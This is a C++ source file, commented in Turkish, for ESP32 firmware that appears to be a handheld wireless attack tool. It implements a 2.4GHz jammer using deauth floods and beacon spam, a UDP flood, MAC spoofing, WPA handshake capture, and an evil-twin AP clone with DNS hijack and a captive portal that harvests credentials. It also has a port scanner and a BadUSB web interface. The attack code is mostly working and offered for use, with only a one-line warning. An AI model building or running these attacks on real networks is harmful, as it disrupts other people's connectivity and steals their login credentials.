// ─── Bruce WebUI başlat ───────────────────────────────────
static void bruceWebUIStart() {
    if (g_bruceServer) { delete g_bruceServer; g_bruceServer = nullptr; }
    g_bruceServer = new WebServer(80);
    g_bruceServer->on("/",         HTTP_GET,  bruceHandleRoot);
    g_bruceServer->on("/sd",       HTTP_GET,  bruceHandleSD);
    g_bruceServer->on("/spiffs",   HTTP_GET,  bruceHandleSPIFFS);
    g_bruceServer->on("/badusb",   HTTP_GET,  bruceHandleBadUSB);
    g_bruceServer->on("/badusb",   HTTP_POST, bruceHandleBadUSB);
    g_bruceServer->on("/logs",     HTTP_GET,  bruceHandleLogs);
    g_bruceServer->on("/cmd",      HTTP_POST, bruceHandleCmd);
    g_bruceServer->on("/api/info", HTTP_GET,  bruceHandleApiInfo);
    g_bruceServer->onNotFound(bruceHandle404);
    g_bruceServer->begin();
    g_bruceStartMs = millis();
    g_bruceRunning = true;
    logPush("[WEBUI] Bruce WebUI started on http://" + WiFi.softAPIP().toString());
}

// ─── Bruce WebUI durdur ───────────────────────────────────
static void bruceWebUIStop() {
    if (g_bruceServer) {
        g_bruceServer->stop();
        delete g_bruceServer;
        g_bruceServer = nullptr;
    }
    g_bruceRunning = false;
    logPush("[WEBUI] Bruce WebUI stopped");
}

// ─── wifi_start_ap_run — Bruce WebUI entegreli (orijinal + WebServer) ──
static void wifi_start_ap_run() {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(g_cfg.apSSID, strlen(g_cfg.apPass) > 0 ? g_cfg.apPass : nullptr);
    delay(200);

    // Bruce WebUI'yi başlat
    bruceWebUIStart();

    String ip = WiFi.softAPIP().toString();
    logPush("[AP] SSID=" + String(g_cfg.apSSID) + " IP=" + ip);

    uint32_t lastDraw = 0;
    while (!readButton()) {
        // WebServer client'larını işle
        if (g_bruceRunning && g_bruceServer)
            g_bruceServer->handleClient();

        // Ekranı saniyede 2 kere güncelle
        if (millis() - lastDraw > 500) {
            lastDraw = millis();
            dispClear();
            // Flipper stili status bar
            dispFlipperStatusBar("WiFi AP+WebUI");
            dispText(0, 13, "SSID: " + String(g_cfg.apSSID));
            dispText(0, 23, "IP:   " + ip);
            dispText(0, 33, "Auth: " + String(strlen(g_cfg.apPass) > 0 ? "WPA2" : "Open"));
            dispText(0, 43, "CLI:  " + String(WiFi.softAPgetStationNum()) + "  WebUI: ON");
            // URL QR-kodu yerine kısa metin
            dispText(0, 53, "http://" + ip.substring(0, 13));
            dispCommit();
        }
    }

    // AP durduruluyor — WebUI kapat
    bruceWebUIStop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    logPush("[AP] Stopped");
}

// ─── TCP Port Scanner ─────────────────────────────────────

static const uint16_t COMMON_PORTS[] = {
    21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
    3389, 8080, 8443, 1883, 502, 102, 47808
};
static constexpr uint8_t COMMON_PORT_COUNT = 17;

static void wifi_portscan_run() {
    bool weShouldDisconnect = false;
    if (!g_staConnected) {
        if (strlen(g_cfg.staSSID) == 0) { dispBannerErr("Set STA SSID in Config!"); return; }
        dispProgress("Port Scan", "Connecting WiFi...", 10);
        if (!wifiSTAConnect(12000)) { dispBannerErr("WiFi connect failed"); return; }
        weShouldDisconnect = true;
    }

    // Hedef: varsayılan gateway
    IPAddress gw = WiFi.gatewayIP();
    char hostBuf[33];
    snprintf(hostBuf, sizeof(hostBuf), "%d.%d.%d.%d", gw[0], gw[1], gw[2], gw[3]);

    dispClear(); dispStatusBar("Port Scan");
    dispText(0, 12, "My IP: " + g_staIP.substring(0,16));
    dispText(0, 22, "Target: " + String(hostBuf));
    dispText(0, 32, "Ports: " + String(COMMON_PORT_COUNT) + " common");
    dispText(0, 44, "[LONG]=custom target");
    dispText(0, 54, "[BTN] scan gateway");
    dispCommit();

    if (readButtonLong()) {
        if (!charPicker(hostBuf, 32, "Target host/IP")) {
            if (weShouldDisconnect) wifiSTADisconnect();
            return;
        }
    } else {
        while (!readButton()) { potApplyBrightness(); delay(50); }
    }

    String targetHost = String(hostBuf);
    std::vector<uint16_t> openPorts;
    WiFiClient client;
    client.setTimeout(1);

    for (uint8_t i = 0; i < COMMON_PORT_COUNT; i++) {
        if (readButtonLong()) break;
        uint16_t port = COMMON_PORTS[i];
        uint8_t pct = (i * 100) / COMMON_PORT_COUNT;
        dispProgress("Scan " + targetHost.substring(0,12), "Port " + String(port) + "...", pct);
        if (client.connect(targetHost.c_str(), port)) {
            openPorts.push_back(port);
            client.stop();
            logPush("[SCAN] " + targetHost + ":" + String(port) + " OPEN");
        }
    }

    if (weShouldDisconnect) wifiSTADisconnect();

    if (g_sdInited && !openPorts.empty()) {
        String out = "=== PortScan " + getTimestamp() + " target=" + targetHost + " ===\n";
        for (auto p : openPorts) out += "OPEN:" + String(p) + "\n";
        sdAppend("/log/portscan.log", out);
    }

    if (!openPorts.empty()) {
        g_xpPortsCnt++;
        xpAdd(XP_PER_PORTSCAN);
    }
    if (openPorts.empty()) { dispBannerWarn("No open ports on " + targetHost.substring(0,12)); return; }
    OptionList res;
    for (auto p : openPorts) res.push_back({":" + String(p) + " OPEN", [](){}});
    res.push_back({"Back", [](){}});
    loopOptions(res, "Open Ports (" + String(openPorts.size()) + ")");
}

// ─── UDP Flood ────────────────────────────────────────────

static void wifi_udp_flood_run() {
    dispClear();
    dispStatusBar("UDP Flood");
    dispText(0, 14, "Target: broadcast");
    dispText(0, 24, "Port: 5005");
    dispText(0, 34, "Warning: use only");
    dispText(0, 44, "on own network.");
    dispText(0, 54, "[BTN] start [LONG] back");
    dispCommit();
    // BTN veya LONG bekle
    while (true) {
        if (readButtonLong()) return;
        if (readButton()) break;
        delay(50);
    }

    WiFi.mode(WIFI_STA);
    WiFiUDP udp;
    udp.begin(5005);
    IPAddress bcast(255,255,255,255);

    static const uint8_t FLOOD_PAYLOAD[64] = {0xDE, 0xAD, 0xBE, 0xEF};
    uint32_t pkts = 0;

    while (!readButtonLong()) {
        udp.beginPacket(bcast, 5005);
        udp.write(FLOOD_PAYLOAD, sizeof(FLOOD_PAYLOAD));
        udp.endPacket();
        pkts++;
        if (pkts % 100 == 0) {
            dispClear();
            dispStatusBar("UDP Flood");
            dispText(0, 20, "Pkts: " + String(pkts));
            dispText(0, 54, "[LONG] stop");
            dispCommit();
        }
    }
    udp.stop();
    WiFi.mode(WIFI_OFF);
    logPush("[UDP] pkts=" + String(pkts));
    dispBanner("Sent " + String(pkts) + " pkts");
}

// ─── MAC Spoof ────────────────────────────────────────────

static void wifi_mac_spoof_run() {
    OptionList opts = {
        {"Random MAC",    [](){}},
        {"iOS-like MAC",  [](){}},
        {"Android-like",  [](){}},
        {"Restore OEM",   [](){}},
        {"Back",          [](){}},
    };
    int sel = loopOptions(opts, "MAC Spoof");
    if (sel < 0 || sel == 4) return;

    uint8_t newMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, newMac); // Get current first

    switch (sel) {
        case 0: // Random
            esp_fill_random(newMac, 6);
            newMac[0] &= 0xFE; // unicast
            newMac[0] |= 0x02; // locally administered
            break;
        case 1: // Apple OUI
            newMac[0] = 0xA4; newMac[1] = 0xC3; newMac[2] = 0xF0;
            esp_fill_random(newMac + 3, 3);
            break;
        case 2: // Samsung OUI
            newMac[0] = 0x8C; newMac[1] = 0x77; newMac[2] = 0x12;
            esp_fill_random(newMac + 3, 3);
            break;
        case 3: // Restore — can't truly restore without NVS, restart instead
            dispBanner("Restart to restore");
            delay(1000); ESP.restart();
            return;
    }

    WiFi.mode(WIFI_STA);
    esp_wifi_set_mac(WIFI_IF_STA, newMac);

    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             newMac[0],newMac[1],newMac[2],newMac[3],newMac[4],newMac[5]);
    logPush("[MAC] spoofed=" + String(macStr));
    xpAdd(XP_PER_ANALYSIS);
    dispBanner(String(macStr), 1500);
    // WiFi.mode(WIFI_OFF) burada çağrılmıyor; 
    // sonraki WiFi fonksiyonları kendi modlarını zaten set ediyor.
}

// ─── Handshake Sniffer ────────────────────────────────────

static void wifi_handshake_run() {
    g_eapolList.clear();
    g_eapolTotal = 0;
    g_sniffPkts  = 0;

    // Scan first if no results
    if (g_scanResults.empty()) wifiScanAll(true);

    wifiInitForRawTx();
    esp_wifi_set_promiscuous_rx_cb(promiscCallback);

    uint8_t ch = 1;
    uint32_t lastSwitch = millis();
    uint32_t lastDraw   = 0;
    bool     channelLocked = false;
    uint8_t  lockedCh = 1;

    dispClear(); dispStatusBar("Handshake Sniff");
    dispText(0, 20, "Scanning all ch..");
    dispText(0, 34, "JoyL/R: lock ch");
    dispText(0, 44, "[LONG] stop");
    dispCommit();
    delay(600);

    while (!readButtonLong()) {
        if (!channelLocked) {
            if (millis() - lastSwitch > g_cfg.scanDwellMs) {
                ch = (ch % 13) + 1;
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                lastSwitch = millis();
            }
        }
        JoyDir jd = readJoystick();
        if (jd == JoyDir::RIGHT) {
            channelLocked = true;
            lockedCh = (lockedCh % 13) + 1;
            esp_wifi_set_channel(lockedCh, WIFI_SECOND_CHAN_NONE);
            ch = lockedCh;
        }
        if (jd == JoyDir::LEFT) {
            channelLocked = true;
            lockedCh = (lockedCh <= 1) ? 13 : lockedCh - 1;
            esp_wifi_set_channel(lockedCh, WIFI_SECOND_CHAN_NONE);
            ch = lockedCh;
        }
        if (jd == JoyDir::DOWN) { channelLocked = false; }

        if (millis() - lastDraw > 220) {
            lastDraw = millis();
            dispClear(); dispStatusBar("Handshake Sniff");
            dispText(0, 12, "EAPOL: " + String(g_eapolTotal) + "  Pkts:" + String(g_sniffPkts));
            dispText(0, 22, "HS found: " + String(g_eapolList.size()));
            if (!g_eapolList.empty()) {
                auto& e = g_eapolList.back();
                String lbl = e.ssid.isEmpty() ? e.apMac.substring(9) : e.ssid;
                dispText(0, 32, ">" + lbl.substring(0,17) + " M" + String(e.type));
            }
            dispText(0, 44, String(channelLocked ? "Ch LOCK:" : "Ch hop: ") + String(ch));
            dispText(0, 54, "D:unhook [LONG]done");
            dispCommit();
        }
        delay(15);
    }
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.mode(WIFI_OFF);

    if (g_eapolList.empty()) {
        dispBannerWarn("No handshakes");
        return;
    }
    OptionList res;
    for (auto& e : g_eapolList) {
        String lbl = e.ssid.isEmpty() ? e.apMac : e.ssid;
        lbl += " M" + String(e.type);
        res.push_back({lbl, [](){}});
    }
    res.push_back({"Back", [](){}});
    g_xpHandshakeCnt++;
    xpAdd(XP_PER_HANDSHAKE);
    loopOptions(res, "Handshakes (" + String(g_eapolList.size()) + ")");
    logPush("[EAPOL] captured=" + String(g_eapolList.size()));
}

// ─── WiFi 2.4GHz Jammer ──────────────────────────────────
// Yöntemi: tüm 2.4GHz kanallarında aynı anda deauth flood +
// sahte beacon spam. Tek kanalda çalışan "noisy neighbor" jammer
// da seçilebilir. ESP32 sadece 1 kanal aynı anda TX yapabilir,
// bu yüzden kanal hopping ile maksimum etki sağlanır.

static void wifi_jammer_run() {
    OptionList modeOpts = {
        {"Full Band (1-13)", [](){}},
        {"Single Channel",  [](){}},
        {"Target AP",       [](){}},
        {"Back",            [](){}},
    };
    int msel = loopOptions(modeOpts, "WiFi Jammer");
    if (msel < 0 || msel == 3) return;

    // Önce tarama yap (Target AP modu veya genel için)
    if (msel == 2 || g_scanResults.empty()) {
        wifiScanAll(true);
        WiFi.scanDelete();
    }

    uint8_t targetChannel = 6; // Single channel default
    uint8_t bssidTarget[6];
    memset(bssidTarget, 0, 6);
    bool hasTarget = false;

    if (msel == 1) {
        // Kanal seç: 1–13
        OptionList chOpts;
        for (uint8_t c = 1; c <= 13; c++)
            chOpts.push_back({"Ch " + String(c), [](){}});
        chOpts.push_back({"Back", [](){}});
        int csel = loopOptions(chOpts, "Select Channel");
        if (csel < 0 || csel >= 13) return;
        targetChannel = csel + 1;
    }
    else if (msel == 2) {
        if (g_scanResults.empty()) { dispBannerWarn("No APs found"); return; }
        OptionList nets;
        for (auto& ap : g_scanResults)
            nets.push_back({(ap.ssid.isEmpty() ? "[hidden]" : ap.ssid) + " ch" + String(ap.channel), [](){}});
        nets.push_back({"Back", [](){}});
        int nsel = loopOptions(nets, "Jam Target AP");
        if (nsel < 0 || nsel >= (int)g_scanResults.size()) return;
        targetChannel = g_scanResults[nsel].channel;
        macFromStr(g_scanResults[nsel].bssid, bssidTarget);
        hasTarget = true;
    }

    wifiInitForRawTx();

    // Jammer fake MAC dizisi — her burst farklı görünür
    uint8_t fakeMac[6] = {0x02, 0xDE, 0xAD, 0x00, 0x00, 0x00};
    static const char* JAMMER_SSIDS[] = {
        "xXxJAMMERxXx", "NoWifi4You", "##########",
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "!!!!!!!!!!!!!!",
        "00000000000000", "DeadNetwork", "NullRoute",
        "BlackHole", "SinkNet"
    };
    static constexpr uint8_t JAMMER_SSID_CNT = 10;

    uint32_t pkts      = 0;
    uint32_t rounds    = 0;
    uint8_t  curCh     = (msel == 0) ? 1 : targetChannel;
    uint32_t lastDraw  = 0;

    // Non-blocking buton kontrolü: sadece pini okur, readButtonLong() gibi
    // state temizleme yapmaz. Bu sayede dış while döngüsündeki
    // readButtonLong() state'i bozulmaz.
    auto joyBtnPressed = []() -> bool {
        return digitalRead(PIN_JOY_BTN) == LOW;
    };

    // Jammer döngüsü
    while (!readButtonLong()) {
        // Full band: 1→6→11→2→7→12→3→8→13→4→9→5→10 (non-overlapping önce)
        static const uint8_t CH_ORDER[] = {1,6,11,2,7,12,3,8,13,4,9,5,10};
        if (msel == 0) {
            // Tüm band: her kanalda kısa burst
            // İÇ DÖNGÜ: readButtonLong() KULLANMA — state bozar.
            // Sadece ham pin durumu kontrol edilir; uzun basış dış while'da yakalanır.
            for (uint8_t ci = 0; ci < 13 && !joyBtnPressed(); ci++) {
                curCh = CH_ORDER[ci];
                esp_wifi_set_channel(curCh, WIFI_SECOND_CHAN_NONE);

                // Burst: deauth+disassoc broadcast + beacon spam
                for (uint8_t b = 0; b < 8; b++) {
                    // Deauth+Disassoc broadcast
                    fakeMac[3] = curCh; fakeMac[4] = b; fakeMac[5] = (uint8_t)(rounds & 0xFF);
                    sendDeauthDisassoc(fakeMac, BROADCAST_MAC, curCh);
                    // Beacon spam
                    sendBeaconFrame(String(JAMMER_SSIDS[(pkts) % JAMMER_SSID_CNT]), curCh, fakeMac);
                    pkts += 5;  // 4 frame (deauth+disassoc x2) + 1 beacon
                }
                delay(5);
            }
        } else {
            // Single / Target channel
            esp_wifi_set_channel(curCh, WIFI_SECOND_CHAN_NONE);
            if (hasTarget) {
                // Target AP'ye yoğun deauth+disassoc
                for (uint8_t b = 0; b < g_cfg.deauthPktsPerBurst * 4; b++) {
                    sendDeauthDisassoc(bssidTarget, BROADCAST_MAC, curCh);
                    pkts += 4;
                }
            }
            // Beacon flood — birden fazla sahte AP aynı kanala
            for (uint8_t si = 0; si < JAMMER_SSID_CNT; si++) {
                fakeMac[3] = si; fakeMac[4] = (uint8_t)(rounds & 0xFF); fakeMac[5] = si*3;
                sendBeaconFrame(String(JAMMER_SSIDS[si]), curCh, fakeMac);
                pkts++;
            }
            delay(DEAUTH_INTERVAL_MS / 2);
        }

        rounds++;

        if (millis() - lastDraw > 250) {
            lastDraw = millis();
            dispClear();
            dispStatusBar("WiFi Jammer");
            if (msel == 0)
                dispText(0, 12, "Mode: FULL BAND");
            else if (msel == 1)
                dispText(0, 12, "Mode: Ch " + String(curCh));
            else
                dispText(0, 12, "Mode: Target Ch" + String(curCh));
            dispText(0, 22, "Pkts: " + String(pkts));
            dispText(0, 32, "Rounds: " + String(rounds));
            dispText(0, 42, "CurCh: " + String(curCh));
            dispText(0, 54, "[LONG] stop");
            dispCommit();
        }
    }

    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    logPush("[JAMMER] pkts=" + String(pkts) + " rounds=" + String(rounds));
    dispBannerOK("Jammer stopped");
    dispBanner("Pkts: " + String(pkts), 1000);
}

// ─── AP Clone (Pineapple style) ───────────────────────────

static void wifi_ap_clone_run() {
    if (g_scanResults.empty()) {
        wifiScanAll(true);
        WiFi.scanDelete();
    }
    if (g_scanResults.empty()) { dispBanner("No networks"); return; }

    OptionList nets;
    for (auto& ap : g_scanResults) {
        String lbl = (ap.ssid.isEmpty() ? "[hidden]" : ap.ssid);
        lbl += " ch" + String(ap.channel) + " " + String(ap.rssi) + "dB";
        nets.push_back({lbl, [](){}});
    }
    nets.push_back({"Back", [](){}});
    int sel = loopOptions(nets, "Clone: Pick AP");
    if (sel < 0 || sel >= (int)g_scanResults.size()) { WiFi.mode(WIFI_OFF); return; }

    APInfo& tgt = g_scanResults[sel];
    String  cloneSSID = tgt.ssid.isEmpty() ? "FreeWiFi" : tgt.ssid;

    // Ask: clone + deauth or just clone?
    OptionList modeOpts = {
        {"Clone only (AP)", [](){}},
        {"Clone + Deauth",  [](){}},
        {"Back",            [](){}},
    };
    int msel = loopOptions(modeOpts, "Clone Mode");
    if (msel < 0 || msel == 2) return;
    bool doDeauth = (msel == 1);

    g_capturedCreds.clear();
    WiFi.mode(WIFI_AP);
    // Use same channel as original AP to maximize effect
    WiFi.softAP(cloneSSID.c_str(), nullptr, tgt.channel, 0, 8);
    delay(200);

    g_dnsServer = new DNSServer();
    g_webServer = new WebServer(EVIL_PORTAL_PORT);
    g_dnsServer->start(DNS_PORT, "*", WiFi.softAPIP());
    g_webServer->on("/",      HTTP_GET,  portalRoot);
    g_webServer->on("/login", HTTP_POST, portalLogin);
    g_webServer->onNotFound(portalNotFound);
    g_webServer->begin();
    logPush("[CLONE_AP] ssid=" + cloneSSID + " ch=" + String(tgt.channel));

    uint8_t bssid[6];
    macFromStr(tgt.bssid, bssid);
    uint32_t deauthPkts = 0;

    if (doDeauth) {
        esp_wifi_set_promiscuous(true);
    }

    while (!readButtonLong()) {
        g_dnsServer->processNextRequest();
        g_webServer->handleClient();

        if (doDeauth) {
            for (uint8_t b = 0; b < g_cfg.deauthPktsPerBurst; b++)
                sendDeauthDisassoc(bssid, BROADCAST_MAC, tgt.channel);
            deauthPkts += g_cfg.deauthPktsPerBurst * 4;
        }

        dispClear(); dispStatusBar("AP Clone");
        dispText(0, 12, cloneSSID.substring(0,20));
        dispText(0, 22, "Clients: " + String(WiFi.softAPgetStationNum()));
        dispText(0, 32, "Creds: " + String(g_capturedCreds.size()));
        if (doDeauth)
            dispText(0, 42, "D+D: " + String(deauthPkts));
        if (!g_capturedCreds.empty())
            dispText(0, 52, ">" + g_capturedCreds.back().substring(0,20));
        else
            dispText(0, 52, "[LONG] stop");
        dispCommit();
        delay(doDeauth ? DEAUTH_INTERVAL_MS : 150);
    }

    if (doDeauth) esp_wifi_set_promiscuous(false);
    g_webServer->stop(); g_dnsServer->stop();
    delete g_webServer; g_webServer = nullptr;
    delete g_dnsServer; g_dnsServer = nullptr;
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);

    if (!g_capturedCreds.empty()) {
        OptionList show;
        for (auto& c : g_capturedCreds) show.push_back({c, [](){}});
        show.push_back({"Back", [](){}});
        loopOptions(show, "Clone Creds");
    } else {
        dispBanner("Clone done, no creds");
    }
}


class WiFiMenu : public MenuItem {
public:
    String getName() override { return "WiFi"; }
    void drawWifiShape(int x, int y, uint16_t col) {
        // 32x32 WiFi: 4 concentric arcs + dot
        // Outermost arc (r=14)
        display.drawCircleHelper(x+16, y+22, 14, 0b0001, col);
        display.drawCircleHelper(x+16, y+22, 14, 0b0010, col);
        // Arc r=10
        display.drawCircleHelper(x+16, y+22, 10, 0b0001, col);
        display.drawCircleHelper(x+16, y+22, 10, 0b0010, col);
        // Arc r=6
        display.drawCircleHelper(x+16, y+22, 6,  0b0001, col);
        display.drawCircleHelper(x+16, y+22, 6,  0b0010, col);
        // Dot
        display.fillCircle(x+16, y+22, 2, col);
    }
    void drawIcon(int x, int y) override    { drawWifiShape(x, y, SSD1306_WHITE); }
    void drawIconInv(int x, int y) override { drawWifiShape(x, y, SSD1306_BLACK); }
    void drawIconSmall(int x, int y, uint16_t col) override {
        // WiFi: 3 yay + merkez nokta, 16x16 alanda
        int cx = x + 8, cy = y + 12;
        display.drawCircleHelper(cx, cy, 3, 0b0001|0b0010, col);
        display.drawCircleHelper(cx, cy, 5, 0b0001|0b0010, col);
        display.drawCircleHelper(cx, cy, 7, 0b0001|0b0010, col);
        display.fillCircle(cx, cy, 1, col);
    }
    void runMenu() override {
        OptionList opts = {
            {"Scan Networks",   []() { wifi_scan_run(); }},
            {"Deauth Attack",   []() { wifi_deauth_run(); }},
            {"Deauth Flood",    []() { wifi_deauth_flood_run(); }},
            {"WiFi Jammer",     []() { wifi_jammer_run(); }},
            {"Beacon Spam",     []() { wifi_beacon_spam_run(); }},
            {"Probe Sniffer",   []() { wifi_probe_sniffer_run(); }},
            {"Raw Sniffer",     []() { wifi_raw_sniffer_run(); }},
            {"Channel Hopper",  []() { wifi_channel_hopper_run(); }},
            {"Evil Portal",     []() { wifi_evil_portal_run(); }},
            {"KARMA Attack",    []() { wifi_karma_run(); }},
            {"Port Scan",       []() { wifi_portscan_run(); }},
            {"UDP Flood",       []() { wifi_udp_flood_run(); }},
            {"MAC Spoof",       []() { wifi_mac_spoof_run(); }},
            {"WPS Scan",        []() { wifi_wps_scan_run(); }},
            {"Start AP",        []() { wifi_start_ap_run(); }},
            {"Handshake Sniff", []() { wifi_handshake_run(); }},
            {"AP Clone",        []() { wifi_ap_clone_run(); }},
            {"Back",            []() { backToMenu(); }},
        };
        while (!g_returnToMenu) {
            int sel = loopOptions(opts, "WiFi");
            if (sel < 0) { backToMenu(); break; }
            if (sel >= 0 && sel < (int)opts.size()) opts[sel].action();
        }
    }
};

